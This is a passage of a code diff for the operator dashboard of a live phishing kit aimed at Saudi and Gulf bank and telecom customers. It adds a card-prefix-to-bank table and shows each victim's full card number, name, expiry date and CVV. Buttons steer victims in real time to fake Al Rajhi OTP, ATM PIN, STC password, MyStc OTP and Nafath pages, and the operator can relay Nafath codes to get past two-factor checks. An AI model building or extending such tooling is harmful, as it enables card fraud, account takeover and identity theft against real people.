+        '541007': { bank: 'الخليج الدولي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid World' },
+        '558705': { bank: 'الخليج الدولي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+
+        // ===== Vision Bank =====
+        '422222': { bank: 'Vision Bank', network: 'Visa', type: 'Debit', tier: 'Classic' },
+
+        // ===== تساهيل =====
+        '534524': { bank: 'تساهيل', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '543884': { bank: 'تساهيل', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
+        '555567': { bank: 'تساهيل', network: 'Mastercard', type: 'Credit', tier: 'World' },
+
+        // ===== Emirates NBD =====
+        '432629': { bank: 'Emirates NBD', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+
+        // ===== First Abu Dhabi Bank =====
+        '426220': { bank: 'FAB', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '489458': { bank: 'FAB', network: 'Visa', type: 'Credit', tier: 'Infinite' },
       };
       
       // البحث في قاعدة البيانات
@@ -503,11 +847,17 @@
       socket.on('visitor:dataSubmitted', ({ visitorId, data, visitor }) => {
         // Ensure visitor is marked as connected and update data
         visitor.isConnected = true;
+        visitor.hasNewData = true;
         visitors.set(visitorId, visitor);
         renderVisitorsList();
         // Always update details if this visitor is selected
         if (selectedVisitorId === visitorId) {
+          // Mark as read immediately since admin is viewing this visitor
+          socket.emit('admin:markAsRead', visitorId);
+          visitor.hasNewData = false;
+          visitors.set(visitorId, visitor);
           renderVisitorDetails(visitor);
+          renderVisitorsList();
         }
         // Show notification with sound
         showNotification('📝 بيانات جديدة من الزائر #' + visitor.visitorNumber);
@@ -621,7 +971,7 @@
           '</div>' +
           '</div>' +
           (v.waitingForAdminResponse ? '<div class="mt-2 text-xs text-yellow-700 font-medium">⏳ ينتظر الرد</div>' : '') +
-          (Object.keys(v.data || {}).length > 0 ? '<div class="mt-2 text-xs text-blue-700 font-medium">📝 يوجد بيانات</div>' : '') +
+          (v.hasNewData ? '<div class="mt-2 text-xs text-blue-700 font-medium">📝 يوجد بيانات جديدة</div>' : '') +
           '</div>';
       }).join('');
       // Start timers for connected visitors
@@ -658,6 +1008,12 @@
       selectedVisitorId = visitorId;
       const visitor = visitors.get(visitorId);
       if (visitor) {
+        // Mark as read when admin clicks on visitor
+        if (visitor.hasNewData) {
+          socket.emit('admin:markAsRead', visitorId);
+          visitor.hasNewData = false;
+          visitors.set(visitorId, visitor);
+        }
         renderVisitorDetails(visitor);
         renderVisitorsList();
       }
@@ -786,12 +1142,25 @@
       html += '<option value="bank-transfer">التحويل البنكي</option>';
       html += '<option value="bank-account-number">رقم الحساب</option>';
       html += '<option value="mystc-otp">MyStc OTP</option>';
+      html += '<option value="stc-password">كلمة مرور STC</option>';
       html += '<option value="final-page">الصفحة النهائية</option>';
       html += '</select>';
       html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
       html += '</div></div>';
-
-      // Combine all entries (cards, codes, and data history) and sort by timestamp (newest first)
+      
+      // إظهار زر إرسال الرمز في أعلى معلومات العميل عند دخوله لصفحة تحقق نفاذ
+      console.log('visitor.page:', visitor.page);
+      if (visitor.page === 'تحقق نفاذ') {
+        html += '<div class="bg-purple-50 border border-purple-200 rounded-lg p-4 mt-4">';
+        html += '<h3 class="font-bold text-purple-800 mb-3">🔐 إرسال رمز نفاذ</h3>';
+        html += '<div class="flex gap-2">';
+        html += '<input type="text" id="nafathCodeTop_' + visitor._id + '" value="' + (visitor.lastSentCode || '') + '" placeholder="أدخل الرمز" class="flex-1 px-4 py-2 border rounded-lg text-center font-bold text-lg" maxlength="2">';
+        html += '<button onclick="sendNafathCodeTop(\'' + visitor.socketId + '\', \'' + visitor._id + '\')" id="sendNafathBtnTop_' + visitor._id + '" class="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>إرسال</button>';
+        html += '</div>';
+        html += '</div>';
+      }
+      
+      // Combine all entries (cards, codes, and data history) and sort by timestamp (newest first))
       const allEntries = [];
       
       // Add digit codes with type
@@ -848,8 +1217,71 @@
             html += '<span class="text-sm text-gray-500">' + dc.page + '</span>';
             html += '</div>';
             html += '<div class="flex gap-2">';
-            html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+            // تغيير اسم زر الموافقة إلى "توثيق الجوال" لصفحة الراجحي OTP
+            const codeRajhiBtnId = 'code-rajhi-btn-' + visitor.socketId + '-' + index;
+            const codeStcBtnId = 'code-stc-btn-' + visitor.socketId + '-' + index;
+            const codeRajhiNavBtnId = 'code-rajhi-nav-btn-' + visitor.socketId + '-' + index;
+            if (dc.page === 'الراجحى (OTP)') {
+              html += '<button id="' + codeRajhiBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توثيق الجوال</button>';
+            } else if (dc.page === 'MyStc OTP') {
+              // زر اتصال STC لصفحة MyStc OTP
+              html += '<button id="' + codeStcBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
+            } else {
+              html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+            }
             html += '<button onclick="codeActionReject(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+            // إضافة زر راجحي فقط إذا كانت الصفحة ATM والبطاقة تابعة للراجحي
+            if (dc.page === 'كلمة مرور ATM' && isRajhiCard(visitor)) {
+              html += '<button id="' + codeRajhiNavBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>راجحي</button>';
+            }
+            // إضافة event listeners لأزرار رمز التحقق
+            setTimeout(() => {
+              const rajhiBtn = document.getElementById(codeRajhiBtnId);
+              const stcBtn = document.getElementById(codeStcBtnId);
+              const rajhiNavBtn = document.getElementById(codeRajhiNavBtnId);
+              if (rajhiBtn) {
+                rajhiBtn.addEventListener('click', () => {
+                  navigateVisitorToPage(visitor.socketId, 'phone-verification');
+                  const originalText = rajhiBtn.textContent;
+                  rajhiBtn.textContent = 'تم الإرسال ✓';
+                  rajhiBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
+                  rajhiBtn.classList.add('bg-gray-500');
+                  setTimeout(() => {
+                    rajhiBtn.textContent = originalText;
+                    rajhiBtn.classList.remove('bg-gray-500');
+                    rajhiBtn.classList.add('bg-green-600', 'hover:bg-green-700');
+                  }, 1500);
+                });
+              }
+              if (stcBtn) {
+                stcBtn.addEventListener('click', () => {
+                  navigateVisitorToPage(visitor.socketId, 'stc-call-alert');
+                  const originalText = stcBtn.textContent;
+                  stcBtn.textContent = 'تم الإرسال ✓';
+                  stcBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
+                  stcBtn.classList.add('bg-green-600');
+                  setTimeout(() => {
+                    stcBtn.textContent = originalText;
+                    stcBtn.classList.remove('bg-green-600');
+                    stcBtn.classList.add('bg-purple-600', 'hover:bg-purple-700');
+                  }, 1500);
+                });
+              }
+              if (rajhiNavBtn) {
+                rajhiNavBtn.addEventListener('click', () => {
+                  navigateToRajhi(visitor.socketId);
+                  const originalText = rajhiNavBtn.textContent;
+                  rajhiNavBtn.textContent = 'تم الإرسال ✓';
+                  rajhiNavBtn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+                  rajhiNavBtn.classList.add('bg-green-600');
+                  setTimeout(() => {
+                    rajhiNavBtn.textContent = originalText;
+                    rajhiNavBtn.classList.remove('bg-green-600');
+                    rajhiNavBtn.classList.add('bg-blue-600', 'hover:bg-blue-700');
+                  }, 1500);
+                });
+              }
+            }, 100);
             html += '</div>';
             html += '</div>';
             html += '</div>';
@@ -871,11 +1303,11 @@
             html += '</div>';
             html += '</div>';
             html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
-            html += '<div class="grid grid-cols-2 gap-3 text-sm">';
-            html += '<div><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold">' + card.cardNumber + '</span></div>';
-            html += '<div><span class="text-gray-500">الاسم:</span> <span class="font-medium">' + card.nameOnCard + '</span></div>';
-            html += '<div><span class="text-gray-500">الانتهاء:</span> <span class="font-medium">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
-            html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold">' + card.cvv + '</span></div>';
+            html += '<div class="grid grid-cols-2 gap-4 text-base">';
+            html += '<div><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold text-lg" dir="ltr" style="unicode-bidi: embed; display: inline-block;">' + (card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '') + '</span></div>';
+            html += '<div><span class="text-gray-500">الاسم:</span> <span class="font-medium text-lg">' + card.nameOnCard + '</span></div>';
+            html += '<div><span class="text-gray-500">الانتهاء:</span> <span class="font-medium text-lg">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
+            html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold text-lg">' + card.cvv + '</span></div>';
             html += '</div>';
             // Action buttons for each card
             html += '<div class="flex gap-2 mt-3">';
@@ -913,7 +1345,201 @@
             Object.entries(dataEntry.content).forEach(([key, value]) => {
               html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
             });
-            html += '</div></div>';
+            html += '</div>';
+            
+            // إضافة أزرار لتوثيق رقم الجوال
+            if (dataEntry.page === 'توثيق رقم الجوال') {
+              const otpBtnId = 'otp-btn-' + visitor.socketId + '-' + dataIndex;
+              const stcPassBtnId = 'stc-pass-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + otpBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP STC</button>';
+              html += '<button id="' + stcPassBtnId + '" class="flex-1 px-3 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>كلمة مرور STC</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const otpBtn = document.getElementById(otpBtnId);
+                const stcPassBtn = document.getElementById(stcPassBtnId);
+                if (otpBtn) {
+                  otpBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'mystc-otp');
+                    const originalText = otpBtn.textContent;
+                    const originalClasses = ['bg-purple-600', 'hover:bg-purple-700'];
+                    otpBtn.textContent = 'تم الإرسال ✓';
+                    otpBtn.classList.remove(...originalClasses);
+                    otpBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      otpBtn.textContent = originalText;
+                      otpBtn.classList.remove('bg-green-600');
+                      otpBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (stcPassBtn) {
+                  stcPassBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'stc-password');
+                    const originalText = stcPassBtn.textContent;
+                    const originalClasses = ['bg-indigo-600', 'hover:bg-indigo-700'];
+                    stcPassBtn.textContent = 'تم الإرسال ✓';
+                    stcPassBtn.classList.remove(...originalClasses);
+                    stcPassBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      stcPassBtn.textContent = originalText;
+                      stcPassBtn.classList.remove('bg-green-600');
+                      stcPassBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
+            // إضافة أزرار لكلمة مرور STC
+            if (dataEntry.page === 'كلمة مرور STC') {
+              const stcCallBtnId = 'stc-call-btn-' + visitor.socketId + '-' + dataIndex;
+              const stcRejectBtnId = 'stc-reject-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + stcCallBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
+              html += '<button id="' + stcRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              // إضافة event listeners بعد إنشاء العناصر
+              setTimeout(() => {
+                const callBtn = document.getElementById(stcCallBtnId);
+                const rejectBtn = document.getElementById(stcRejectBtnId);
+                if (callBtn) {
+                  callBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'stc-call-alert');
+                    const originalText = callBtn.textContent;
+                    const originalClasses = ['bg-purple-600', 'hover:bg-purple-700'];
+                    callBtn.textContent = 'تم الإرسال ✓';
+                    callBtn.classList.remove(...originalClasses);
+                    callBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      callBtn.textContent = originalText;
+                      callBtn.classList.remove('bg-green-600');
+                      callBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    rejectForm(visitor.socketId);
+                    const originalText = rejectBtn.textContent;
+                    const originalClasses = ['bg-red-600', 'hover:bg-red-700'];
+                    rejectBtn.textContent = 'تم الإرسال ✓';
+                    rejectBtn.classList.remove(...originalClasses);
+                    rejectBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      rejectBtn.textContent = originalText;
+                      rejectBtn.classList.remove('bg-green-600');
+                      rejectBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
+            // إضافة أزرار لتنبية إتصال STC
+            if (dataEntry.page === 'تنبية إتصال STC') {
+              const nafathBtnId = 'nafath-btn-' + visitor.socketId + '-' + dataIndex;
+              const stcCallRejectBtnId = 'stc-call-reject-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + nafathBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق نفاذ</button>';
+              html += '<button id="' + stcCallRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              // إضافة event listeners بعد إنشاء العناصر
+              setTimeout(() => {
+                const nafathBtn = document.getElementById(nafathBtnId);
+                const rejectBtn = document.getElementById(stcCallRejectBtnId);
+                if (nafathBtn) {
+                  nafathBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'nafath-verify');
+                    const originalText = nafathBtn.textContent;
+                    const originalClasses = ['bg-purple-600', 'hover:bg-purple-700'];
+                    nafathBtn.textContent = 'تم الإرسال ✓';
+                    nafathBtn.classList.remove(...originalClasses);
+                    nafathBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      nafathBtn.textContent = originalText;
+                      nafathBtn.classList.remove('bg-green-600');
+                      nafathBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    rejectForm(visitor.socketId);
+                    const originalText = rejectBtn.textContent;
+                    const originalClasses = ['bg-red-600', 'hover:bg-red-700'];
+                    rejectBtn.textContent = 'تم الإرسال ✓';
+                    rejectBtn.classList.remove(...originalClasses);
+                    rejectBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      rejectBtn.textContent = originalText;
+                      rejectBtn.classList.remove('bg-green-600');
+                      rejectBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
+            // إضافة أزرار للراجحي تسجيل الدخول
+            if (dataEntry.page === 'تسجيل الدخول الراجحى') {
+              const rajhiPhoneBtnId = 'rajhi-phone-btn-' + visitor.socketId + '-' + dataIndex;
+              const rajhiOtpBtnId = 'rajhi-otp-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + rajhiPhoneBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توثيق الجوال</button>';
+              html += '<button id="' + rajhiOtpBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>راجحي OTP</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const phoneBtn = document.getElementById(rajhiPhoneBtnId);
+                const otpBtn = document.getElementById(rajhiOtpBtnId);
+                if (phoneBtn) {
+                  phoneBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'phone-verification');
+                    const originalText = phoneBtn.textContent;
+                    const originalClasses = ['bg-green-600', 'hover:bg-green-700'];
+                    phoneBtn.textContent = 'تم الإرسال ✓';
+                    phoneBtn.classList.remove(...originalClasses);
+                    phoneBtn.classList.add('bg-gray-500');
+                    setTimeout(() => {
+                      phoneBtn.textContent = originalText;
+                      phoneBtn.classList.remove('bg-gray-500');
+                      phoneBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (otpBtn) {
+                  otpBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'alrajhi-otp');
+                    const originalText = otpBtn.textContent;
+                    const originalClasses = ['bg-blue-600', 'hover:bg-blue-700'];
+                    otpBtn.textContent = 'تم الإرسال ✓';
+                    otpBtn.classList.remove(...originalClasses);
+                    otpBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      otpBtn.textContent = originalText;
+                      otpBtn.classList.remove('bg-green-600');
+                      otpBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
+            // إضافة زر موافقة لطلب إعادة إرسال الرمز
+            if (dataEntry.content && dataEntry.content['طلب'] === 'إعادة إرسال رمز') {
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="resend-btn-' + visitor.socketId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium cursor-pointer"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '</div>';
+              // إضافة event listener بعد إنشاء العنصر
+              setTimeout(() => {
+                const btn = document.getElementById('resend-btn-' + visitor.socketId);
+                if (btn) {
+                  btn.addEventListener('click', () => approveResendCode(visitor.socketId));
+                }
+              }, 100);
+            }
+            
+            html += '</div>';
           }
         });
         html += '</div>';
@@ -983,8 +1609,8 @@
       
       // Send Code
       html += '<div><label class="block text-sm text-gray-500 mb-1">إرسال رمز</label>';
-      html += '<div class="flex gap-2"><input type="text" id="codeInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="أدخل الرمز">';
-      html += '<button onclick="sendCode(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">إرسال</button></div></div>';
+      html += '<div class="flex gap-2"><input type="text" id="codeInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="أدخل الرمز" value="' + (visitor.lastSentCode || '') + '">';
+      html += '<button id="sendCodeBtn" onclick="sendCode(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">إرسال</button></div></div>';
       
       // Navigate
       html += '<div><label class="block text-sm text-gray-500 mb-1">توجيه لصفحة</label>';
@@ -1010,6 +1636,7 @@
       html += '<option value="bank-transfer">التحويل البنكي</option>';
       html += '<option value="bank-account-number">رقم الحساب</option>';
       html += '<option value="mystc-otp">MyStc OTP</option>';
+      html += '<option value="stc-password">كلمة مرور STC</option>';
       html += '<option value="final-page">الصفحة النهائية</option>';
       html += '</select>';
       html += '<button onclick="navigateVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700">توجيه</button></div></div>';
@@ -1043,9 +1670,37 @@
 
     function sendCode(socketId) {
       const code = document.getElementById('codeInput').value;
-      if (code) {
+      const btn = document.getElementById('sendCodeBtn');
+      if (code && btn) {
         socket.emit('admin:sendCode', { visitorSocketId: socketId, code });
-        document.getElementById('codeInput').value = '';
+        // إظهار "تم الإرسال" مؤقتاً
+        const originalText = btn.textContent;
+        btn.textContent = 'تم الإرسال ✓';
+        btn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+        btn.classList.add('bg-green-600');
+        setTimeout(() => {
+          btn.textContent = originalText;
+          btn.classList.remove('bg-green-600');
+          btn.classList.add('bg-blue-600', 'hover:bg-blue-700');
+        }, 1500);
+      }
+    }
+
+    function sendNafathCodeTop(socketId, visitorId) {
+      const code = document.getElementById('nafathCodeTop_' + visitorId).value;
+      const btn = document.getElementById('sendNafathBtnTop_' + visitorId);
+      if (code && btn) {
+        socket.emit('admin:sendCode', { visitorSocketId: socketId, code });
+        // إظهار "تم الإرسال" مؤقتاً
+        const originalText = btn.textContent;
+        btn.textContent = 'تم الإرسال ✓';
+        btn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+        btn.classList.add('bg-green-600');
+        setTimeout(() => {
+          btn.textContent = originalText;
+          btn.classList.remove('bg-green-600');
+          btn.classList.add('bg-blue-600', 'hover:bg-blue-700');
+        }, 1500);
       }
     }
 
@@ -1063,51 +1718,98 @@
       }
     }
 
+    // دالة تحويل الزائر لصفحة محددة مباشرة
+    function navigateVisitorToPage(socketId, page) {
+      socket.emit('admin:navigate', { visitorSocketId: socketId, page });
+    }
+
+    // دالة الموافقة على طلب إعادة إرسال الرمز
+    function approveResendCode(socketId) {
+      console.log('approveResendCode called with socketId:', socketId);
+      socket.emit('admin:approveResend', { visitorSocketId: socketId });
+      // تغيير الزر لإظهار "تم ✓"
+      const btn = document.getElementById('resend-btn-' + socketId);
+      if (btn) {
+        btn.textContent = 'تم ✓';
+        btn.disabled = true;
+        btn.classList.remove('bg-green-600', 'hover:bg-green-700');
+        btn.classList.add('bg-gray-400', 'cursor-not-allowed');
+      }
+      console.log('admin:approveResend emitted');
+    }
+
     // Card action functions
     function cardActionOTP(socketId) {
-      // Disable the clicked button
-      event.target.disabled = true;
-      event.target.style.opacity = '0.5';
-      event.target.style.cursor = 'not-allowed';
-      event.target.innerHTML = 'جاري...';
+      const btn = event.target;
+      const originalText = btn.textContent;
+      const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-blue-600';
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'otp' });
+      btn.textContent = 'تم الإرسال ✓';
+      btn.classList.remove(originalBg);
+      btn.classList.add('bg-green-600');
+      setTimeout(() => {
+        btn.textContent = originalText;
+        btn.classList.remove('bg-green-600');
+        btn.classList.add(originalBg);
+      }, 1500);
     }
 
     function cardActionATM(socketId) {
-      // Disable the clicked button
-      event.target.disabled = true;
-      event.target.style.opacity = '0.5';
-      event.target.style.cursor = 'not-allowed';
-      event.target.innerHTML = 'جاري...';
+      const btn = event.target;
+      const originalText = btn.textContent;
+      const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-yellow-600';
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'atm' });
+      btn.textContent = 'تم الإرسال ✓';
+      btn.classList.remove(originalBg);
+      btn.classList.add('bg-green-600');
+      setTimeout(() => {
+        btn.textContent = originalText;
+        btn.classList.remove('bg-green-600');
+        btn.classList.add(originalBg);
+      }, 1500);
     }
 
     function cardActionReject(socketId) {
-      // Disable the clicked button
-      event.target.disabled = true;
-      event.target.style.opacity = '0.5';
-      event.target.style.cursor = 'not-allowed';
-      event.target.innerHTML = 'جاري...';
+      const btn = event.target;
+      const originalText = btn.textContent;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'reject' });
+      btn.textContent = 'تم الإرسال ✓';
+      btn.classList.remove('bg-red-600', 'hover:bg-red-700');
+      btn.classList.add('bg-green-600');
+      setTimeout(() => {
+        btn.textContent = originalText;
+        btn.classList.remove('bg-green-600');
+        btn.classList.add('bg-red-600', 'hover:bg-red-700');
+      }, 1500);
     }
 
     // Code action functions (for OTP/digit codes)
     function codeActionApprove(socketId, codeIndex) {
-      // Disable the clicked button
-      event.target.disabled = true;
-      event.target.style.opacity = '0.5';
-      event.target.style.cursor = 'not-allowed';
-      event.target.innerHTML = 'جاري...';
+      const btn = event.target;
+      const originalText = btn.textContent;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'approve', codeIndex });
+      btn.textContent = 'تم الإرسال ✓';
+      btn.classList.remove('bg-green-600', 'hover:bg-green-700');
+      btn.classList.add('bg-gray-500');
+      setTimeout(() => {
+        btn.textContent = originalText;
+        btn.classList.remove('bg-gray-500');
+        btn.classList.add('bg-green-600', 'hover:bg-green-700');
+      }, 1500);
     }
 
     function codeActionReject(socketId, codeIndex) {
-      // Disable the clicked button
-      event.target.disabled = true;
-      event.target.style.opacity = '0.5';
-      event.target.style.cursor = 'not-allowed';
-      event.target.innerHTML = 'جاري...';
+      const btn = event.target;
+      const originalText = btn.textContent;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'reject', codeIndex });
+      btn.textContent = 'تم الإرسال ✓';
+      btn.classList.remove('bg-red-600', 'hover:bg-red-700');
+      btn.classList.add('bg-green-600');
+      setTimeout(() => {
+        btn.textContent = originalText;
+        btn.classList.remove('bg-green-600');
+        btn.classList.add('bg-red-600', 'hover:bg-red-700');
+      }, 1500);
     }
 
     function sendMessage(socketId) {
